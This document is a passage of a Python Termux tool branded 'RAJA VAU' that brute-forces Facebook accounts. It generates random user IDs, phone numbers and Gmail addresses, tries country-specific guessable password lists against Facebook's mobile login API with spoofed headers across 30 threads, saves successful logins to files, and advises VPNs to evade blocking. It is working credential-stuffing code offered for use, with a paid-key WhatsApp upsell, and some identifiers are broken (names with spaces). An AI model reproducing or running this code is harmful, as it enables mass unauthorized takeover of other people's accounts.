            print(' \033[1;91m[\033[1;92m-\033[1;91m] \033[1;97m GMAIL ID CRACK')
            print(' \033[1;91m[\033[1;92m-\033[1;91m] \033[1;97m OLD ID CRACK')
            print(' \033[1;91m[\033[1;92m-\033[1;91m] \033[1;97m GAME CRACK')
            linex()
            print(' \033[1;91m[\033[1;92m1\033[1;91m] \033[1;97m WHATSAPP  ADMIN : RAJA VAU ')
            print(' \033[1;91m[\033[1;92m2\033[1;91m] \033[1;97m WHATSAPP GROUP  ')
            linex()
            choice = input(' \033[1;91m[\033[1;92m-\033[1;91m] \033[1;97m CHOOSE : ')
            if choice in ['1', '01']:
                tsk = 'HELLO RAJA VAU BOSS! I NEED TO BUY YOUR PREMIUM TOOLS SO PLEASE APPROVE MY KEY-:)\n\nName: ' + ___username___ + ' \nKey: ' + bumper
                os.system(f'termux-open-url "https://wa.me/+8801319644658?text={tsk}"')
                approval()
            if choice in ['2', '02']:
                tsk = 'HELLO RAJA VAU BOSS! I NEED TO BUY YOUR PREMIUM TOOLS SO PLEASE APPROVE MY KEY-:)\n\nName: ' + ___username___ + ' \nKey: ' + bumper
                os.system(f'termux-open-url "https://chat.whatsapp.com/GHcW6KYs56c2aVQPsCvsD4?mode=gi_c={tsk}"')
                approval()
    except requests.exceptions.ConnectionError:
        print(' \033[1;91m[\033[1;92m-\033[1;91m] \033[1;97m NO INTERNET CONNECTION...')
        exit()

logo = """
\033[1;31m  ____      _      _    _      __     __    _    _   _ 
\033[1;33m |  _ \    / \    | |  / \     \ \   / /   / \  | | | |
\033[1;32m | |_) |  / _ \   | | / _ \     \ \ / /   / _ \ | | | |
\033[1;36m |  _ <  / ___ \  | |/ ___ \     \ V /   / ___ \| |_| |
\033[1;34m |_| \_\/_/   \_\/ |/_/   \_\     \_/   /_/   \_\\\\___/ 
\033[1;35m               |__/                                    \033[0m

\033[1;36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m
 \033[1;35m[\033[1;32m★\033[1;35m] \033[1;36mOWNER       \033[1;37m: \033[1;32mRAJA VAU
 \033[1;35m[\033[1;32m★\033[1;35m] \033[1;36mYOUTUBE     \033[1;37m: \033[1;33mREALITY-VOICE_KING_KAMAL
 \033[1;35m[\033[1;32m★\033[1;35m] \033[1;36mTOOL TYPE   \033[1;37m: \033[1;32mPREMIUM CLONING \033[1;37m(\033[1;35mSPECIAL EDITION\033[1;37m)
 \033[1;35m[\033[1;32m★\033[1;35m] \033[1;36mSTATUS      \033[1;37m: \033[1;32mACTIVE & PREMIUM
\033[1;36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m
 \033[1;31m[\033[1;37m!\033[1;31m] \033[1;32mTHIS TOOL IS PAID BUT I MADE IT FREE FOR MY SUBSCRIBERS!\033[0m
\033[1;36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m
"""
print(logo)
print(f'\033[1;91m[\033[1;92m-\033[1;91m] \033[1;97m USERNAME : {___username___}')
print(f'\033[1;91m[\033[1;92m-\033[1;91m] \033[1;97m KEY      : {bumper}')
print('\033[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
X = '\033[1;37m'
rad = '\033[38;5;196m'
G = '\033[38;5;46m'
Y = '\033[38;5;220m'
PP = '\033[38;5;203m'
RR = '\033[38;5;196m'
GS = '\033[38;5;40m'
W = '\033[1;37m'
P = '\033[1;97m'
M = '\033[1;33m'
H = '\033[1;32m'
K = '\033[1;97m'
B = '\033[1;96m'
U = '\033[1;95m'
O = '\033[1;97m'
R = '\033[38;5;246m'
N = '\033[0m'
loop = 0
oks = []
cps = []
pcp = []
id = []
uid = []
tokenku = []
def menu():
    clear()
    print(' \033[1;91m[\033[1;92m1\033[1;91m] \033[1;97m FILE CLONING\n \033[1;91m[\033[1;92m2\033[1;91m] \033[1;97m RANDOM CLONING\n \033[1;91m[\033[1;92m3\033[1;91m] \033[1;97m GMAIL CLONING \n \033[1;91m[\033[1;92m4\033[1;91m] \033[1;97m OLD CLONING\n \033[1;91m[\033[1;92m5\033[1;91m] \033[1;97m JOIN WHATSAPP GROUP\n \033[1;91m[\033[1;92m0\033[1;91m] \033[1;97m EXIT')
    linex()
    xd = input(' \033[1;91m[\033[1;92m-\033[1;91m] \033[1;97m CHOOSE : ')
    if xd in ['1', '01']:
        clear()
        print(' \033[1;91m[\033[1;92m-\033[1;91m] \033[1;97m EXAMPLE : /sdcard/RAJA VAU.txt etc..')
        linex()
        file = input(' \033[1;91m[\033[1;92m-\033[1;91m] \033[1;97m PUT FILE PATH : \033[1;32m')
        try:
            fo = open(file, 'r', encoding='utf-8', errors='ignore').read().splitlines()
        except FileNotFoundError:
            print(' \033[1;91m[\033[1;91m!\033[1;91m] \033[1;91m FILE LOCATION NOT FOUND ')
            time.sleep(1)
            menu()
        clear()
        print(' \033[1;91m[\033[1;92m-\033[1;91m] \033[1;97m ALL METHOD WORKING ')
        linex()
        print(' \033[1;91m[\033[1;92m1\033[1;91m] \033[1;97m METHOD ')
        print(' \033[1;91m[\033[1;92m2\033[1;91m] \033[1;97m METHOD ')
        print(' \033[1;91m[\033[1;92m3\033[1;91m] \033[1;97m METHOD ')
        print(' \033[1;91m[\033[1;92m4\033[1;91m] \033[1;97m METHOD ')
        print(' \033[1;91m[\033[1;92m5\033[1;91m] \033[1;97m METHOD ')
        print(' \033[1;91m[\033[1;92m6\033[1;91m] \033[1;97m METHOD ')
        print(' \033[1;91m[\033[1;92m7\033[1;91m] \033[1;97m METHOD ')
        print(' \033[1;91m[\033[1;92m8\033[1;91m] \033[1;97m METHOD ')
        linex()
        mthd = input(' \033[1;91m[\033[1;92m-\033[1;91m] \033[1;97m CHOOSE : ')
        plist = []
        clear()
        print(' \033[1;91m[\033[1;92m1\033[1;91m] \033[1;97m AUTO PASSWORD ')
        print(' \033[1;91m[\033[1;92m2\033[1;91m] \033[1;97m CHOICE PASSWORD ')
        linex()
        passlist = input(' \033[1;91m[\033[1;92m-\033[1;91m] \033[1;97m CHOOSE : ')
        if passlist in ['1', '01']:
            clear()
            print(' \033[1;91m[\033[1;92m1\033[1;91m] \033[1;97m AUTO BANGLADESH PASSLIST ')
            print(' \033[1;91m[\033[1;92m2\033[1;91m] \033[1;97m AUTO PAKISTAN PASSLIST ')
            print(' \033[1;91m[\033[1;92m3\033[1;91m] \033[1;97m AUTO NEPAL PASSLIST ')
            print(' \033[1;91m[\033[1;92m4\033[1;91m] \033[1;97m AUTO INDIAN PASSLIST ')
            print(' \033[1;91m[\033[1;92m5\033[1;91m] \033[1;97m AUTO PHILIPPINES PASSLIST ')
            linex()
            countrypasslist = input(' \033[1;91m[\033[1;92m-\033[1;91m] \033[1;97m CHOOSE : ')
            if countrypasslist in ['1', '01']:
                plist.extend([
                    'first last', 'first1020', 'first100', 'firstlast', 'firstlast@@', 
                    'first7788', 'firstlast000', '@@##12', 'firstlast99', '123456', 
                    'first1122', 'first123', 'first12345', 'first1234', 'firstlast123', 
                    'firstlast1234', 'firstlast@123', 'last123', 'Last12345', 'first123456', 
                    'first@123', 'First@123', 'first321', 'First@12', 'first@1234', 
                    'First123', '@first123', '@first1234', 'first@@@'
                ])
            elif countrypasslist in ['2', '02']:
                plist.extend([
                    'First Last', 'firstlast', 'first12', 'firstlast@@', 'first7788', 
                    'firstlast000', '@@##12', 'firstlast99', 'first1122', 'firstlast12', 
                    'firstlast123', 'firstlast786', 'firstlast1234', 'firstlast1122', 
                    'first@123', 'first1122', 'first786', 'first111', 'firstlast111', 
                    'last786', 'first khan', 'first@786', '786786'
                ])
            elif countrypasslist in ['3', '03']:
                plist.extend([
                    'first last', 'First Last', 'first123', 'firstlast@@', 'first7788', 
                    'firstlast000', '@@##12', 'firstlast99', '123456', 'first1122', 
                    'firstlast', 'firstfirst', 'First@123', 'first@123', 'first@1234', 
                    'last123', 'first@last', 'first@12345', 'firstlast12345', 'Nepal@123', 
                    'kathmandu', 'i love you'
                ])
            elif countrypasslist in ['4', '04']:
                plist.extend([
                    '57575751', 'first last', '57273200', '59039200', 'firstlast@@', 
                    'first7788', 'firstlast000', '@@##12', 'firstlast99', '123456', 
                    'first1122', '07860786', 'firstlast', 'first12', 'first 25', 
                    'firstlast123', 'first 123', 'first@12345', 'first123', 'first@123', 
                    '@first123', 'first12', 'first@12', 'firstlast@123', 'first last', 
                    '57273200', '59039200', '07860786', 'firstlast', 'md first', 
                    'mdfirst', 'first12', 'first 25', 'firstlast123', 'first 123', 
                    'first@12345', 'first@123', '@first123'
                ])
            elif countrypasslist in ['5', '05']:
                plist.extend([
                    'first last', 'firstlast@@', 'first7788', 'firstlast000', '@@##12', 
                    'firstlast99', '123456', 'first1122', 'firstlast143', 'lastfirst123', 
                    'lastfirst143', 'first123', 'first12345', 'first123456', 'first123456789', 
                    'first143', 'last123', 'last143', 'firstpogi', 'firstganda'
                ])
        else:
            try:
                ps_limit = int(input(' \033[1;91m[\033[1;92m-\033[1;91m] \033[1;97m HOW MANY PASSWORDS DO YOU WANT TO ADD ? : '))
            except:
                ps_limit = 1
            clear()
            print(' \033[1;91m[\033[1;92m-\033[1;91m] \033[1;97m EXAMPLE : first last,firstlast,first123')
            linex()
            for i in range(ps_limit):
                plist.append(input(f' \033[1;91m[\033[1;92m-\033[1;91m] \033[1;97m PASSWORD NO.{i + 1}: '))
        clear()
        print(' \033[1;91m[\033[1;92m-\033[1;91m] \033[1;97mDO YOU WENT SHOW CP ACCOUNT? (y/n): ')
        linex()
        cx = input(' \033[1;91m[\033[1;92m-\033[1;91m] \033[1;97m CHOOSE : ')
        if cx in ['y', 'Y', 'yes', 'Yes', '1']:
            pcp.append('y')
        else:
            pcp.append('n')
        with tred(max_workers=30) as crack_submit:
            clear()
            total_ids = str(len(fo))
            print(' \033[1;91m[\033[1;92m-\033[1;91m] \033[1;97m TOTAL ACCOUNT IDS : \033[1;32m' + total_ids + ' ')
            print(' \033[1;91m[\033[1;92m-\033[1;91m] \033[1;97m USE FLIGHT MODE FOR SPEED UP ')
            linex()
            for user in fo:
                ids, names = user.split('|')
                passlist = plist
                if mthd in ['1', '01']:
                    crack_submit.submit(api1, ids, names, passlist)
                elif mthd in ['2', '02']:
                    crack_submit.submit(api2, ids, names, passlist)
                elif mthd in ['3', '03']:
                    crack_submit.submit(api3, ids, names, passlist)
                elif mthd in ['4', '04']:
                    crack_submit.submit(api4, ids, names, passlist)
                elif mthd in ['5', '05']:
                    crack_submit.submit(api5, ids, names, passlist)
                elif mthd in ['6', '06']:
                    crack_submit.submit(api6, ids, names, passlist)
                elif mthd in ['7', '07']:
                    crack_submit.submit(api7, ids, names, passlist)
                elif mthd in ['8', '08']:
                    crack_submit.submit(api8, ids, names, passlist)
        print('\033[1;37m')
        linex()
        print(' \033[1;91m[\033[1;92m-\033[1;91m] \033[1;97m THE PROCESS HAS COMPLETED')
        linex()
        print(' \033[1;91m[\033[1;92m-\033[1;91m] \033[1;97m TOTAL OK/CP: ' + str(len(oks)) + '/' + str(len(cps)))
        linex()
        input(' \033[1;91m[\033[1;92m-\033[1;91m] \033[1;97m PRESS ENTER TO BACK ')
        menu()
    else:
        if xd in ['2', '02']:
            pak()
        elif xd in ['3', '03']:
            gmail()
            exit()
        elif xd in ['4', '04']:
            cracker = old_clone()
            cracker.old_menu()
        elif xd in ['5', '05']:
            os.system('xdg-open https://chat.whatsapp.com/GHcW6KYs56c2aVQPsCvsD4?mode=gi_c')
            menu()
        elif xd in ['0', '00']:
            exit(' \033[1;91m[\033[1;92m-\033[1;91m] \033[1;97m THANKS FOR USE🥰 ')
        else:
            print(' \033[1;91m[\033[1;91m!\033[1;91m] \033[1;91m OPTION NOT FOUND IN MENU...')
            time.sleep(2)
            menu()
def pak():
    user = []
    clear()
    print(' \033[1;91m[\033[1;92m-\033[1;91m] \033[1;97m PUT YOUR OWN COUNTRY CODE')
    code = input(' \033[1;91m[\033[1;92m-\033[1;91m] \033[1;97m PUT CODE : ')
    clear()
    try:
        limit = int(input(' \033[1;91m[\033[1;92m-\033[1;91m] \033[1;97m PUT LIMIT : '))
    except ValueError:
        limit = 5000
    clear()
    print(' \033[1;91m[\033[1;92m1\033[1;91m] \033[1;97m METHOD ')
    linex()
    mthd = input(' \033[1;91m[\033[1;92m-\033[1;91m] \033[1;97m CHOOSE : ')
    clear()
    print(' \033[1;91m[\033[1;92m1\033[1;91m] \033[1;97m PAKISTAN CLONING\n \033[1;91m[\033[1;92m2\033[1;91m] \033[1;97m AFGHANISTAN CLONING\n \033[1;91m[\033[1;92m3\033[1;91m] \033[1;97m BANGLADESH CLONING\n \033[1;91m[\033[1;92m4\033[1;91m] \033[1;97m INDIA CLONING\n \033[1;91m[\033[1;92m5\033[1;91m] \033[1;97m NEPAL CLONING\n \033[1;91m[\033[1;92m6\033[1;91m] \033[1;97m PHILIPPINES CLONING ')
    linex()
    pcs = input(' \033[1;91m[\033[1;92m-\033[1;91m] \033[1;97m CHOOSE : ')
    for nmbr in range(limit):
        nmp = ''.join((random.choice(string.digits) for _ in range(7)))
        user.append(nmp)
    with tred(max_workers=30) as ERROR:
        clear()
        tl = str(len(user))
        print(' \033[1;91m[\033[1;92m-\033[1;91m] \033[1;97m TOTAL ACCOUNT ID : \033[1;32m' + tl + ' ')
        print(' \033[1;91m[\033[1;92m-\033[1;91m] \033[1;97m USE FLIGHT MODE FOR SPEED UP ')
        linex()
        for psx in user:
            ids = code + psx
            if pcs in ['1', '01']:
                passlist = [psx, ids, 'khankhan', 'khan1122', 'janjan', 'khanbaba', 'pakistan', 'khan12345', 'khankhan12345', 'pak123', 'pak12345', 'pakistan', 'khan123', 'baloch', 'kingkhan']
            elif pcs in ['2', '02']:
                passlist = [psx, ids, '200300', 'afghanistan', '۱۲۳۴۵۶۷۸۹', 'khan12345', 'khan123', '500500', '۱۲۳۴۵۶']
            elif pcs in ['3', '03']:
                passlist = [psx, ids, 'Bangladesh', 'bangladesh', 'i love you', 'iloveyou', 'free fire', 'freefire', '57575751', '57273200', 'i love you', 'iloveyou', '59039200', '708090']
            elif pcs in ['4', '04']:
                passlist = [psx, ids, '57575751', '57273200', 'i love you', 'iloveyou', '59039200', '708090']
            elif pcs in ['5', '05']:
                passlist = [ids, psx, ids[:8], ids[:7], ids[:6], 'nepal12', 'nepal123', 'nepal1234', 'nepal12345', 'maya123', 'kathmandu', 'pokhara', 'tamang', 'maya1234', 'tamang123', 'tamang12345', 'nepal@123', 'kathmandu123']
            elif pcs in ['6', '06']:
                passlist = [psx, ids, 'magandaako', 'gandako', 'pogiako', 'pogiako123', 'gwapoako123', 'gwapoako', 'iloveyou', 'i love you', 'cuteko', 'cuteko123', 'cuteko143', 'mahal123', 'mahal143', 'iloveyou143', 'maganda123', 'maganda143', 'pogi123', 'pogi143']
            else:
                passlist = [psx, ids]

            if mthd in ['1', '01']:
                ERROR.submit(RAJA VAU1, ids, passlist)
            elif mthd in ['2', '02']:
                ERROR.submit(ERROR2, ids, passlist)
            elif mthd in ['3', '03']:
                ERROR.submit(ERROR3, ids, passlist)
            elif mthd in ['4', '04']:
                ERROR.submit(ERROR4, ids, passlist)
                
    print('\033[1;37m')
    linex()
    print(' \033[1;91m[\033[1;92m-\033[1;91m] \033[1;97m THE PROCESS HAS COMPLETED')
    linex()
    print(' \033[1;91m[\033[1;92m-\033[1;91m] \033[1;97m TOTAL OK/CP: ' + str(len(oks)) + '/' + str(len(cps)))
    linex()
    input(' \033[1;91m[\033[1;92m-\033[1;91m] \033[1;97m PRESS ENTER TO BACK ')
    menu()

def gmail():
    os.system('rm -rf .re.txt')
    clear()
    print(' \033[1;91m[\033[1;92m-\033[1;91m] \033[1;97m EXAMPLE : Hamza, ali, sajjad, faizan')
    linex()
    first = input(' \033[1;91m[\033[1;92m-\033[1;91m] \033[1;97m PUT FIRST NAME : ')
    linex()
    print(' \033[1;91m[\033[1;92m-\033[1;91m] \033[1;97m EXAMPLE : khan, ahmad, ali')
    linex()
    last = input(' \033[1;91m[\033[1;92m-\033[1;91m] \033[1;97m PUT LAST NAME : ')
    domain = '@gmail.com'
    linex()
    try:
        limit = int(input(' \033[1;91m[\033[1;92m-\033[1;91m] \033[1;97m PUT LIMIT : '))
    except ValueError:
        limit = 5000
    linex()
    print(' \033[1;91m[\033[1;92m-\033[1;91m] \033[1;97m GETTING GMAILS...')
    lists = ['3', '4']
    for xd in range(limit):
        lchoice = random.choice(lists)
        if '3' in lchoice:
            mail = ''.join((random.choice(string.digits) for _ in range(3)))
            open('.re.txt', 'a').write(first.lower() + last.lower() + mail + domain + '|' + first + ' ' + last + '\n')
        else:
            mail = ''.join((random.choice(string.digits) for _ in range(4)))
            open('.re.txt', 'a').write(first.lower() + last.lower() + mail + domain + '|' + first + ' ' + last + '\n')
            
    fo = open('.re.txt', 'r').read().splitlines()
    with tred(max_workers=30) as XD:
        total = str(len(fo))
        clear()
        print(' \033[1;91m[\033[1;92m-\033[1;91m] \033[1;97m TOTAL ACCOUNT MAIL : \033[1;32m' + total)
        print(' \033[1;91m[\033[1;92m-\033[1;91m] \033[1;97m THE PROCESS HIS BEEN STARTED ')
        linex()
        for user in fo:
            ids, names = user.split('|')
            first_name = names.rsplit(' ')[0]
            try:
                last_name = names.rsplit(' ')[1]
            except IndexError:
                last_name = 'Khan'
            fs = first_name.lower()
            ls = last_name.lower()
            passlist = [fs + ls, fs + ' ' + ls, first_name + last_name, first_name + ' ' + last_name, fs + '123', fs + '786', fs + '12345', fs + '1122']
            XD.submit(RAJA VAU1, ids, passlist)
            
    print('\033[1;37m')
    linex()
    print(' \033[1;91m[\033[1;92m-\033[1;91m] \033[1;97m THE PROCESS HAS COMPLETED')
    linex()
    print(' \033[1;91m[\033[1;92m-\033[1;91m] \033[1;97m TOTAL OK/CP: ' + str(len(oks)) + '/' + str(len(cps)))
    linex()
    input(' \033[1;91m[\033[1;92m-\033[1;91m] \033[1;97m PRESS ENTER TO BACK ')
    menu()

def old_clone():
    clear()
    print(' \033[1;91m[\033[1;92m1\033[1;91m] \033[1;97m✔ ALL SERIES')
    print(' \033[1;91m[\033[1;92m2\033[1;91m] \033[1;97m 100003/4/✔ SERIES')
    print(' \033[1;91m[\033[1;92m3\033[1;91m] \033[1;97m 2009-2010✔ SERIES')
    linex()
    _input = input(' \033[1;91m[\033[1;92m-\033[1;91m] \033[1;97m CHOOSE : ')
    if _input in ['1', '01']:
        old_one()
    elif _input in ['2', '02']:
        old_tow()
    elif _input in ['3', '03']:
        old_tree()
    else:
        time.sleep(2)
        old_clone()

def old_one():
    user = []
    clear()
    limit = input(' \033[1;91m[\033[1;92m-\033[1;91m] \033[1;97m LIMIT  : ')
    star = '10000'
    for _ in range(int(limit)):
        data = str(random.choice(range(1000000000, 1999999999)))
        user.append(data)
    clear()
    print(' \033[1;91m[\033[1;92m1\033[1;91m] \033[1;97m METHOD 1')
    print(' \033[1;91m[\033[1;92m2\033[1;91m] \033[1;97m METHOD 2')
    print(' \033[1;91m[\033[1;92m3\033[1;91m] \033[1;97m METHOD 3')
    linex()
    meth = input(' \033[1;91m[\033[1;92m-\033[1;91m] \033[1;97m CHOOSE : ').strip().upper()
    with tred(max_workers=30) as pool:
        clear()
        print(f' \033[1;91m[\033[1;92m-\033[1;91m] \033[1;97m TOTAL ACCOUNT IDS : \033[1;32m{limit}')
        print(' \033[1;91m[\033[1;92m-\033[1;91m] \033[1;92m USE AIRPLANE & PAID VPN FOR GOOD RESULT')
        linex()
        for mal in user:
            uid = star + mal
            if meth == '1':
                pool.submit(login_1, uid)
            elif meth == '2':
                pool.submit(login_2, uid)
            elif meth == '3':
                pool.submit(login_3, uid)
            elif meth == '4':
                pool.submit(login_4, uid)
                
    print()
    linex()
    print(' \033[1;91m[\033[1;92m-\033[1;91m] \033[1;97m THE PROCESS HAS COMPLETED')
    linex()
    print(' \033[1;91m[\033[1;92m-\033[1;91m] \033[1;97m TOTAL OK : \033[1;92m' + str(len(oks)))
    linex()
    input(' \033[1;91m[\033[1;92m-\033[1;91m] \033[1;97m PRESS ENTER TO BACK ')
    main()
def old_tow():
    user = []
    clear()
    limit = input(' \033[1;91m[\033[1;92m-\033[1;91m] \033[1;97m LIMIT : ')
    prefixes = '100004'
    for _ in range(int(limit)):
        prefix = random.choice(prefixes)
        suffix = ''.join(random.choices('0123456789', k=9))
        uid = prefix + suffix
        user.append(uid)
    clear()
    print(' \033[1;91m[\033[1;92m1\033[1;91m] \033[1;97m METHOD 1')
    print(' \033[1;91m[\033[1;92m2\033[1;91m] \033[1;97m METHOD 2')
    print(' \033[1;91m[\033[1;92m3\033[1;91m] \033[1;97m METHOD 3')
    linex()
    meth = input(' \033[1;91m[\033[1;92m-\033[1;91m] \033[1;97m CHOOSE : ').strip().upper()
    with tred(max_workers=30) as pool:
        clear()
        print(f' \033[1;91m[\033[1;92m-\033[1;91m] \033[1;97m TOTAL ACCOUNT IDS : \033[1;32m{limit}')
        print(' \033[1;91m[\033[1;92m-\033[1;91m] \033[1;92m USE AIRPLANE & PAID VPN FOR GOOD RESULT')
        linex()
        for uid in user:
            if meth == '1':
                pool.submit(login_1, uid)
            elif meth == '2':
                pool.submit(login_2, uid)
            elif meth == '3':
                pool.submit(login_3, uid)
            elif meth == '4':
                pool.submit(login_4, uid)
                
    print()
    linex()
    print(' \033[1;91m[\033[1;92m-\033[1;91m] \033[1;97m THE PROCESS HAS COMPLETED')
    linex()
    print(' \033[1;91m[\033[1;92m-\033[1;91m] \033[1;97m TOTAL OK : \033[1;92m' + str(len(oks)))
    linex()
    input(' \033[1;91m[\033[1;92m-\033[1;91m] \033[1;97m PRESS ENTER TO BACK ')
    main()

def old_tree():
    user = []
    clear()
    limit = input(' \033[1;91m[\033[1;92m-\033[1;91m] \033[1;97m LIMIT : ')
    prefix = '1000004'
    for _ in range(int(limit)):
        suffix = ''.join(random.choices('0123456789', k=8))
        uid = prefix + suffix
        user.append(uid)
    clear()
    print(' \033[1;91m[\033[1;92m1\033[1;91m] \033[1;97m METHOD 1')
    print(' \033[1;91m[\033[1;92m2\033[1;91m] \033[1;97m METHOD 2')
    print(' \033[1;91m[\033[1;92m3\033[1;91m] \033[1;97m METHOD 3')
    linex()
    meth = input(' \033[1;91m[\033[1;92m-\033[1;91m] \033[1;97m CHOOSE : ').strip().upper()
    with tred(max_workers=30) as pool:
        clear()
        print(f' \033[1;91m[\033[1;92m-\033[1;91m] \033[1;97m TOTAL ACCOUNT IDS : \033[1;32m{limit}')
        print(' \033[1;91m[\033[1;92m-\033[1;91m] \033[1;92m USE AIRPLANE & PAID VPN FOR GOOD RESULT')
        linex()
        for uid in user:
            if meth == '1':
                pool.submit(login_1, uid)
            elif meth == '2':
                pool.submit(login_2, uid)
            elif meth == '3':
                pool.submit(login_3, uid)
            elif meth == '4':
                pool.submit(login_4, uid)
                
    print()
    linex()
    print(' \033[1;91m[\033[1;92m-\033[1;91m] \033[1;97m THE PROCESS HAS COMPLETED')
    linex()
    print(' \033[1;91m[\033[1;92m-\033[1;91m] \033[1;97m TOTAL OK : \033[1;92m' + str(len(oks)))
    linex()
    input(' \033[1;91m[\033[1;92m-\033[1;91m] \033[1;97m PRESS ENTER TO BACK ')
    main()

def login_1(uid):
    global loop
    session = requests.session()
    color = random.choice([P, M, H, K, B, U, O, N])
    sys.stdout.write(f'\r\r\033[1;97m[RAJA-VAUXD-M1\033[1;97m]\033[1;97m-\033[1;97m[{color}{loop}\033[1;97m]\033[1;97m-\033[1;97m[\033[1;92mOK-:{len(oks)}\033[1;97m]')
    sys.stdout.flush()
    sys.stdout.flush()
    try:
        for pw in ['123456', '123123', '1234567', '12345678', '123456789']:
            data = {
                'adid': str(uuid.uuid4()), 'format': 'json', 'device_id': str(uuid.uuid4()), 
                'cpl': 'true', 'family_device_id': str(uuid.uuid4()), 'credentials_type': 'device_based_login_password', 
                'error_detail_type': 'button_with_disabled', 'source': 'device_based_login', 'email': str(uid), 
                'password': str(pw), 'advertiser_id': str(uuid.uuid4()), 'client_country_code': 'US', 
                'method': 'auth.login', 'fb_api_req_friendly_name': 'authenticate', 
                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler', 
                'api_key': '882a8490361da98702bf97a021ddc14d'
            }
            headers = {
                'User-Agent': window1(), 'Content-Type': 'application/x-www-form-urlencoded', 
                'Host': 'graph.facebook.com', 'X-FB-Net-HNI': '25227', 'X-FB-SIM-HNI': '29752', 
                'X-FB-Connection-Type': 'MOBILE.LTE', 'X-Tigon-Is-Retry': 'False', 
                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;', 'x-fb-device-group': '5120', 
                'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 
                'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 
                'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'
            }
            res = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, allow_redirects=False).json()
            if 'session_key' in res:
                print('\r\r\033[1;96m[RAJA-VAU✔] ' + uid + ' | ' + pw + ' |' + ashaa(uid) + '')
                open('/sdcard/RAJA-VAU/RAJA VAU-OLD-M1-OK.txt', 'a').write(uid + '|' + pw + '\n')
                oks.append(uid)
                break
            elif 'www.facebook.com' in res.get('error', {}).get('message', ''):
                print('\r\r\033[1;96m[RAJA-VAU✔] ' + uid + ' | ' + pw + ' |' + ashaa(uid) + '')
                open('/sdcard/RAJA-VAU/RAJA VAU-OLD-M1-OK.txt', 'a').write(uid + '|' + pw + '\n')
                oks.append(uid)
                break
        loop += 1
    except Exception:
        time.sleep(5)

def login_2(uid):
    global loop
    session = requests.session()
    color = random.choice([P, M, H, K, B, U, O, N])
    sys.stdout.write(f'\r\r\033[1;97m[RAJA-VAUXD-M2\033[1;97m]\033[1;97m-\033[1;97m[{color}{loop}\033[1;97m]\033[1;97m-\033[1;97m[\033[1;92mOK-:{len(oks)}\033[1;97m]')
    sys.stdout.flush()
    sys.stdout.flush()
    try:
        for pw in ['123456', '123123', '1234567', '12345678', '123456789']:
            data = {
                'adid': str(uuid.uuid4()), 'format': 'json', 'device_id': str(uuid.uuid4()), 
                'cpl': 'true', 'family_device_id': str(uuid.uuid4()), 'credentials_type': 'device_based_login_password', 
                'error_detail_type': 'button_with_disabled', 'source': 'device_based_login', 'email': str(uid), 
                'password': str(pw), 'advertiser_id': str(uuid.uuid4()), 'client_country_code': 'US', 
                'method': 'auth.login', 'fb_api_req_friendly_name': 'authenticate', 
                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler', 
                'api_key': '882a8490361da98702bf97a021ddc14d'
            }
            headers = {
                'User-Agent': windows(), 'Content-Type': 'application/x-www-form-urlencoded', 
                'Host': 'graph.facebook.com', 'X-FB-Net-HNI': '25227', 'X-FB-SIM-HNI': '29752', 
                'X-FB-Connection-Type': 'MOBILE.LTE', 'X-Tigon-Is-Retry': 'False', 
                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;', 'x-fb-device-group': '5120', 
                'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 
                'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 
                'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'
            }
            res = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, allow_redirects=False).json()
            if 'session_key' in res:
                print('\r\r\033[1;96m[RAJA-VAU✔] ' + uid + ' | ' + pw + ' |' + ashaa(uid) + '')
                open('/sdcard/RAJA-VAU/RAJA VAU-OLD-M2-OK.txt', 'a').write(uid + '|' + pw + '\n')
                oks.append(uid)
                break
            elif 'www.facebook.com' in res.get('error', {}).get('message', ''):
                print('\r\r\033[1;96m[RAJA-VAU✔] ' + uid + ' | ' + pw + ' |' + ashaa(uid) + '')
                open('/sdcard/RAJA-VAU/RAJA VAU-OLD-M2-OK.txt', 'a').write(uid + '|' + pw + '\n')
                oks.append(uid)
                break
        loop += 1
    except Exception:
        time.sleep(5)
def login_3(uid):
    global loop
    session = requests.session()
    color = random.choice([P, M, H, K, B, U, O, N])
    sys.stdout.write(f'\r\r\033[1;97m[RAJA-VAUXD-M3\033[1;97m]\033[1;97m-\033[1;97m[{color}{loop}\033[1;97m]\033[1;97m-\033[1;97m[\033[1;92mOK-:{len(oks)}\033[1;97m]')
    sys.stdout.flush()
    sys.stdout.flush()
    try:
        for pw in ['123456', '123123', '1234567', '12345678', '123456789']:
            data = {
                'adid': str(uuid.uuid4()), 'format': 'json', 'device_id': str(uuid.uuid4()), 
                'cpl': 'true', 'family_device_id': str(uuid.uuid4()), 'credentials_type': 'device_based_login_password', 
                'error_detail_type': 'button_with_disabled', 'source': 'device_based_login', 'email': str(uid), 
                'password': str(pw), 'advertiser_id': str(uuid.uuid4()), 'client_country_code': 'US', 
                'method': 'auth.login', 'fb_api_req_friendly_name': 'authenticate', 
                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler', 
                'api_key': '882a8490361da98702bf97a021ddc14d'
            }
            headers = {
                'User-Agent': window1(), 'Content-Type': 'application/x-www-form-urlencoded', 
                'Host': 'graph.facebook.com', 'X-FB-Net-HNI': '25227', 'X-FB-SIM-HNI': '29752', 
                'X-FB-Connection-Type': 'MOBILE.LTE', 'X-Tigon-Is-Retry': 'False', 
